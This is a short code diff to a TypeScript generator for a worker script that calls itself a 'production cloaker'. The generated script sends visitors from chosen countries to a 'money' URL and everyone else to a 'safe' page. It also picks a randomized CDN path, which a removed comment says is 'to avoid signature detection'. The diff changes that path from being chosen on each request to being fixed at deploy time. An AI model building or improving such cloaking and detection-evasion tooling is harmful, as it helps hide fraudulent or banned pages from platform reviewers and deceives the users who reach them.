@@ -743,6 +743,10 @@ export function generateJciWorkerScript(options: {
     .map(country => countryNameToCode[country] || country)
     .filter(code => code); // Remove any undefined values
   
+  // Generate random CDN path ONCE per deployment (not per request)
+  const cdnPaths = ['r8', 'imgx', 'assets', 'static', 'res', 'cdn', 'media', 'files'];
+  const selectedCdnPath = cdnPaths[Math.floor(Math.random() * cdnPaths.length)];
+  
   return `// --- MODIE's FINAL PRODUCTION CLOAKER ---
 // This is the main worker script. It combines the advanced proxy engine with the hybrid cloaking logic.
 
@@ -754,9 +758,8 @@ const TARGET_COUNTRIES = ${JSON.stringify(targetCountryCodes)};
 const MONEY_URL = '${moneyUrl}';
 const SAFE_URL = '${safePageUrl}';
 
-// Randomized CDN path to avoid signature detection
-const CDN_PATHS = ['r8', 'imgx', 'assets', 'static', 'res', 'cdn', 'media', 'files'];
-const CDN_PATH = CDN_PATHS[Math.floor(Math.random() * CDN_PATHS.length)];
+// Static CDN path for this deployment (randomized once at deploy time)
+const CDN_PATH = '${selectedCdnPath}';
 // --- END CONFIGURATION ---
 
 addEventListener('fetch', event => {
